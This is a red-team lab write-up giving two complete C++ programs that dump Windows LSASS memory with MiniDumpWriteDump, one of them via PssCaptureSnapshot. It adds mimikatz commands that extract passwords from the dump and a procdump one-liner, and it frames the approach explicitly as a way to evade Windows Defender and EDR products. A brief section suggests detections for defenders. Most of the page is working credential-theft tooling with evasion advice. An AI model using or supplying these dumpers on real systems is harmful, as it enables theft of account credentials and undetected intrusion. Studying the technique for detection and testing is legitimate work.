---
description: 'Evasion, Credential Dumping'
---

# Dumping LSASS without Mimikatz with MiniDumpWriteDump == Reduced Chances of Getting Flagged by AVs

This lab explores how one could write a simple `lsass` process dumper for extracting the passwords it contains later on with mimikatz. **Possibly** without getting detected by some AV vendors - if you have a way of testing this against some known EDR solutions, I would be interested to hear about your findings.

{% hint style="info" %}
The below code uses a number of known Windows API calls that could still be flagged by some antivirus agent or EDR solution.
{% endhint %}

## MiniDumpWriteDump Code

Below is a simple code that leverages `MiniDumpWriteDump` API call to dump lsass.exe process memory. Let's go ahead and compile this C++ code:

{% code title="dumper.cpp" %}
```cpp
#include "stdafx.h"
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
using namespace std;

int main() {
	DWORD lsassPID = 0;
	HANDLE lsassHandle = NULL; 
	HANDLE outFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	LPCWSTR processName = L"";

	if (Process32First(snapshot, &processEntry)) {
		while (_wcsicmp(processName, L"lsass.exe") != 0) {
			Process32Next(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			lsassPID = processEntry.th32ProcessID;
		}
		wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;
	}
	
	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
	
	if (isDumped) {
		cout << "[+] lsass dumped successfully!" << endl;
	}
	
    return 0;
}
```
{% endcode %}

{% file src="../../.gitbook/assets/createminidump.exe" caption="CreateMiniDump.exe" %}

Do not forget to add `dbghelp.lib` as a dependency in the Linker &gt; Input settings for your C++ project if the compiler is giving you a hard time:

![](../../.gitbook/assets/screenshot-from-2019-03-23-17-01-44.png)

## Execution Demo

1. Execute CreateMiniDump.exe \(compiled file above\) or compile your own binary
2. Lsass.dmp gets dumped to the working directory
3. Take the lsass.dmp offline to your attacking machine
4. Open mimikatz and load in the dump file 
5. Dump passwords

{% code title="attacker" %}
```csharp
.\createminidump.exe
.\mimikatz.exe
sekurlsa::minidump c:\temp\lsass.dmp
sekurlsa::logonpasswords
```
{% endcode %}

![](../../.gitbook/assets/peek-2019-03-23-22-16.gif)

## Why it's worth it?

See how Windows Defender on Windows 10 is flagging up mimikatz immediately... but allows running CreateMiniDump.exe? Good for us - we get lsass.exe dumped to `lsass.dmp`:

![](../../.gitbook/assets/peek-2019-03-23-21-25.gif)

..which then can be read in mimikatz offline:

![](../../.gitbook/assets/screenshot-from-2019-03-23-21-26-41.png)

Of ourse, there is procdump that does the same thing and it does not get flagged by Windows defender, but it is always good to know there are alternatives you could turn to if you need to for whatever reason. 

## Observations

As mentioned earlier, the code above uses a native windows API call `MiniDumpWriteDump` to make a memory dump of a given process. If you are on the blue team and trying to write detections for these activities, you may consider looking for processes loading in `dbghelp.dll` module and calling `MiniDumpWriteDump` function:

![](../../.gitbook/assets/screenshot-from-2019-03-23-17-08-29.png)

## PssCaptureSnapshot

`PssCaptureSnapshot` is another Windows API that lets us dump LSASS using `MiniDumpWriteDump` that may help us sneak past some AVs/EDRs for now.

{% hint style="info" %}
The benefit of using `PssCaptureSnapshot` is that when `MiniDumpWriteDump` is called from your malware, it will not be reading lsass process memory directly and instead will do so from the process's snapshot.
{% endhint %}

Below is the modified dumper code that uses the `PssCaptureSnapshot` to obtain a snapshot of the LSASS process. The handle that is returned by the `PssCaptureSnapshot` is then used in the `MiniDumpWriteDump` call instead of the LSASS process handle. This is done via the minidump callback:

```cpp
#include "stdafx.h"
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <processsnapshot.h>
#pragma comment (lib, "Dbghelp.lib")

using namespace std;

BOOL CALLBACK MyMiniDumpWriteDumpCallback(
	__in     PVOID CallbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
	switch (CallbackInput->CallbackType)
	{
	case 16: // IsProcessSnapshotCallback
		CallbackOutput->Status = S_FALSE;
		break;
	}
	return TRUE;
}

int main() {
	DWORD lsassPID = 0;
	HANDLE lsassHandle = NULL;
	HANDLE outFile = CreateFile(L"c:\\temp\\lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	LPCWSTR processName = L"";

	if (Process32First(snapshot, &processEntry)) {
		while (_wcsicmp(processName, L"lsass.exe") != 0) {
			Process32Next(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			lsassPID = processEntry.th32ProcessID;
		}
		wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;
	}

	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);

	HANDLE snapshotHandle = NULL;
	DWORD flags = (DWORD)PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;
	MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
	ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	CallbackInfo.CallbackRoutine = &MyMiniDumpWriteDumpCallback;
	CallbackInfo.CallbackParam = NULL;

	PssCaptureSnapshot(lsassHandle, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, (HPSS*)&snapshotHandle);

	BOOL isDumped = MiniDumpWriteDump(snapshotHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);

	if (isDumped) {
		cout << "[+] lsass dumped successfully!" << endl;
	}

	PssFreeSnapshot(GetCurrentProcess(), (HPSS)snapshotHandle);
	return 0;
}
```

![](../../.gitbook/assets/capture-snapshot-lsass.gif)

Note that this is the way `procdump.exe` works when `-r` flag is specified: 

![procdump help](../../.gitbook/assets/image%20%28333%29.png)

To confirm, if we execute procdump like so:

```text
procdump -accepteula -r -ma lsass.exe lsass.dmp
```

...and inspect the APIs that are being called under the hood, we will see that `procdump` is indeed dynamically resolving the `PssCaptureSnapshot` address inside the `kernel32.dll`:

![](../../.gitbook/assets/image%20%28486%29.png)

## References

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot" %}

{% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/proc\_snap/export-a-process-snapshot-to-a-file" %}

{% embed url="https://docs.microsoft.com/en-us/windows/win32/api/processsnapshot/nf-processsnapshot-psscapturesnapshot" %}

